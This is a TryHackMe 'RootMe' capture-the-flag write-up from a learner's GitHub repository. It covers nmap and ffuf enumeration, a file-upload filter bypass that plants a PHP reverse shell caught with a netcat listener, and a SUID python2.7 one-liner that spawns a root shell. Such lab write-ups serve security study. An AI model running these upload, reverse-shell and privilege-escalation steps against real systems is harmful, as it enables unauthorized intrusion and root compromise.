<p align="center">
  <img src="https://repository-images.githubusercontent.com/518509014/f7450454-158c-45e0-8b38-0c0ae4d7394c" width="800">
</p>

<h1 align="center">⚡ CTF // Offensive Security Writeups ⚡</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Focus-Offensive%20Security-red">
  <img src="https://img.shields.io/badge/Platform-TryHackMe-green">
  <img src="https://img.shields.io/badge/Status-Active%20Learning-success">
</p>

---

> _"Hack the planet. Document the process."_  

This repository documents my hands-on practice in Capture The Flag (CTF) platforms.

The purpose of this repository is to:
- Improve practical penetration testing skills
- Strengthen enumeration methodology
- Practice Linux & Windows privilege escalation
- Develop Active Directory attack techniques

---
## 🎯 Focus Areas

- Web Exploitation
- File Upload Bypass
- Reverse Shell Handling
- Linux Privilege Escalation
- Windows Privilege Escalation
- Active Directory Enumeration
- Post-Exploitation Techniques
---
# 🧠 Methodology

Recon → Enumeration → Exploitation → Privilege Escalation → Post-Exploitation

---
rootme - tryhackme

## Enumeration

1: nmap scan
 - command:nmap -sV -sC -A X0.X8.1X1.1X2.

 - open ports and services run on them:

 - 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
 - 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
 - OS: Linux; CPE: cpe:/o:linux:linux_kernel
<img src="https://github.com/ABHI02G/CTF-writeups/blob/main/rootme-ctf%20(Tryhackme)/rootme-images/nmap-scan.png?raw=true" height="400"> 

2: ffuf
 - command: ffuf -w /home/haxxx/SecLists/Discovery/Web-Content/common.txt -u http://X0.X8.1X1.1X2/FUZZ

 - the hidden directorys are:
    a)/uploads
    b)/panel
    c)/index.php
<img src="https://github.com/Ganesha-hk/CTF-writeups/blob/main/rootme-ctf%20(Tryhackme)/rootme-images/directory-fuzzing.png?raw=true" height="400"> 

3: backend Launguage running
 - php
 <img src="https://github.com/Ganesha-hk/CTF-writeups/blob/main/rootme-ctf%20(Tryhackme)/rootme-images/getting%20rce.png?raw=true" height="400"> 
   
## Initial Access

 - There is file upload vulnerabilty on /panel directory
 - useing .php5 extension upload a php reverse shell
 - once uploaded run
 - rlwrap nc -lvnp (port number as in reverse shell used)
 - go to /upload directory on website and run uploaded shell.php5 and get rce back
 <img src="https://github.com/Ganesha-hk/CTF-writeups/blob/main/rootme-ctf%20(Tryhackme)/rootme-images/os-details%20of%20victim.png?raw=true" height="400"> 

## Privelege Esculation

 - run find / -perm -u=s 2>/dev/null
 - There is a suid permision vulnerability
 - for the file /usr/bin/python2.7
 - as these file cat run as root even normal user run it hence
 - run /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 - get the root shell
  <img src="https://github.com/Ganesha-hk/CTF-writeups/blob/main/rootme-ctf%20(Tryhackme)/rootme-images/root%20access.png?raw=true" height="400">

## 📚 Lessons Learned

- File upload bypass using alternative PHP extensions
- Importance of checking SUID binaries
- Python SUID privilege escalation technique

<img src="https://github.com/Ganesha-hk/CTF-writeups/blob/main/rootme-ctf%20(Tryhackme)/rootme-images/upload%20directory%20on%20web-app.png?raw=true" height="400">
---

## ⚠ Disclaimer

These writeups are created for educational purposes only.  
Do not use techniques described here on systems without authorization.
